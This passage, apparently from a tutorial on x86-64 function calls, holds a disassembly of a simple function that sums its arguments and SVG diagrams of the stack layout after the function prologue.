<text text-anchor='middle' x='400' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='416' y='164' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='416' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='416' y='308' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='424' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='424' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='432' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='440' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='448' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='456' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='464' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='472' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='488' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='496' y='164' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='496' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='496' y='308' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='504' y='164' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='504' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='504' y='308' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='512' y='164' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='512' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='512' y='308' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='520' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='528' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='536' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='544' y='228' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='568' y='196' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='576' y='196' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='584' y='196' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='592' y='196' fill='currentColor' style='font-size:1em'>0</text>
</g>

    </svg>
  
</div>
<p>After this, the instruction pointer starts pointing towards the instructions of the <code>func2</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0000000000001119</span> <span class="err">&lt;</span><span class="nf">func2</span><span class="err">&gt;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="err">1119:</span>       <span class="err">55</span>                      <span class="nf">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">    <span class="err">111</span><span class="nl">a:</span>       <span class="err">48</span> <span class="err">89</span> <span class="nf">e5</span>                <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">    <span class="err">111</span><span class="nl">d:</span>       <span class="err">89</span> <span class="err">7</span><span class="nf">d</span> <span class="no">ec</span>                <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x14</span><span class="p">],</span><span class="no">edi</span>
</span></span><span class="line"><span class="cl">    <span class="err">1120:</span>       <span class="err">89</span> <span class="err">75</span> <span class="nf">e8</span>                <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x18</span><span class="p">],</span><span class="no">esi</span>
</span></span><span class="line"><span class="cl">    <span class="err">1123:</span>       <span class="err">89</span> <span class="err">55</span> <span class="nf">e4</span>                <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x1c</span><span class="p">],</span><span class="no">edx</span>
</span></span><span class="line"><span class="cl">    <span class="err">1126:</span>       <span class="err">89</span> <span class="err">4</span><span class="nf">d</span> <span class="no">e0</span>                <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x20</span><span class="p">],</span><span class="no">ecx</span>
</span></span><span class="line"><span class="cl">    <span class="err">1129:</span>       <span class="err">44</span> <span class="err">89</span> <span class="err">45</span> <span class="nf">dc</span>             <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x24</span><span class="p">],</span><span class="no">r8d</span>
</span></span><span class="line"><span class="cl">    <span class="err">112</span><span class="nl">d:</span>       <span class="err">44</span> <span class="err">89</span> <span class="err">4</span><span class="nf">d</span> <span class="no">d8</span>             <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x28</span><span class="p">],</span><span class="no">r9d</span>
</span></span><span class="line"><span class="cl">    <span class="err">1131:</span>       <span class="nf">c7</span> <span class="mi">45</span> <span class="no">f8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">    <span class="err">1138:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">55</span> <span class="no">ec</span>                <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x14</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">113</span><span class="nl">b:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">e8</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x18</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">113</span><span class="nl">e:</span>       <span class="err">01</span> <span class="nf">c2</span>                   <span class="no">add</span>    <span class="no">edx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">    <span class="err">1140:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">e4</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x1c</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">1143:</span>       <span class="err">01</span> <span class="nf">c2</span>                   <span class="no">add</span>    <span class="no">edx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">    <span class="err">1145:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">e0</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">1148:</span>       <span class="err">01</span> <span class="nf">c2</span>                   <span class="no">add</span>    <span class="no">edx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">    <span class="err">114</span><span class="nl">a:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">dc</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x24</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">114</span><span class="nl">d:</span>       <span class="err">01</span> <span class="nf">c2</span>                   <span class="no">add</span>    <span class="no">edx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">    <span class="err">114</span><span class="nl">f:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">d8</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x28</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">1152:</span>       <span class="err">01</span> <span class="nf">c2</span>                   <span class="no">add</span>    <span class="no">edx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">    <span class="err">1154:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="mi">10</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="mi">0x10</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">1157:</span>       <span class="err">01</span> <span class="nf">c2</span>                   <span class="no">add</span>    <span class="no">edx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">    <span class="err">1159:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="mi">18</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp</span><span class="err">+</span><span class="mi">0x18</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">115</span><span class="nl">c:</span>       <span class="err">01</span> <span class="nf">d0</span>                   <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="no">edx</span>
</span></span><span class="line"><span class="cl">    <span class="err">115</span><span class="nl">e:</span>       <span class="err">89</span> <span class="err">45</span> <span class="nf">fc</span>                <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">    <span class="err">1161:</span>       <span class="nf">c6</span> <span class="mi">45</span> <span class="no">f7</span> <span class="mi">41</span>             <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x9</span><span class="p">],</span><span class="mi">0x41</span>
</span></span><span class="line"><span class="cl">    <span class="err">1165:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">fc</span>                <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="err">1168:</span>       <span class="err">5</span><span class="nf">d</span>                      <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">    <span class="err">1169:</span>       <span class="nf">c3</span>                      <span class="no">ret</span>
</span></span></code></pre></div><p>This is the biggest function we have seen so far&hellip; We already know the <em>prologue</em> that covers the first 2 instructions of this assembly code. Let&rsquo;s read and try to understand further instructions. Before starting that, let&rsquo;s see how our stack looks like after this function&rsquo;s prologue.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 672 361"
      >
      <g transform='translate(8,16)'>
<path d='M 440,160 L 440,176' fill='none' stroke='currentColor'></path>
<path d='M 440,176 L 440,192' fill='none' stroke='currentColor'></path>
<circle cx='168' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='168' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='184' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='184' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='200' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='200' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='216' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='216' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<text text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='32' y='260' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='40' y='260' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='48' y='260' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='64' y='260' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='72' y='260' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='80' y='260' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='88' y='260' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='144' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='168' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='168' y='228' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='168' y='260' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='168' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='176' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='176' y='228' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='176' y='260' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='176' y='292' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='116' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='184' y='148' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='184' y='228' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='184' y='260' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='184' y='292' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='192' y='148' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='192' y='292' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='200' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='200' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='208' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='208' y='292' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='116' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='224' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='224' y='292' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='232' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='232' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='240' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='240' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='248' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='248' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='256' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='256' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='256' y='292' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='264' y='148' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='264' y='292' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='272' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='272' y='148' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='272' y='292' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='280' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='116' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='288' y='148' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='288' y='292' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='296' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='116' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='296' y='148' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='296' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='304' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='116' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='312' y='148' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='312' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='320' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='320' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='320' y='292' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='328' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='328' y='148' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='328' y='292' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='336' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='116' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='336' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='336' y='292' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='344' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='292' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='352' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='116' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='352' y='148' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='360' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='360' y='148' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='360' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='368' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='368' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='368' y='292' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='376' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='116' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='376' y='148' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='376' y='292' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='384' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='292' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='392' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='20' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='408' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='416' y='148' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='416' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='424' y='148' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='424' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='424' y='292' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='432' y='148' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='432' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='432' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='148' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='440' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='440' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='180' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='464' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='180' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='472' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='180' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='480' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='180' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='504' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='512' y='292' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='520' y='292' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='560' y='292' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='568' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='292' fill='currentColor' style='font-size:1em'>─</text>
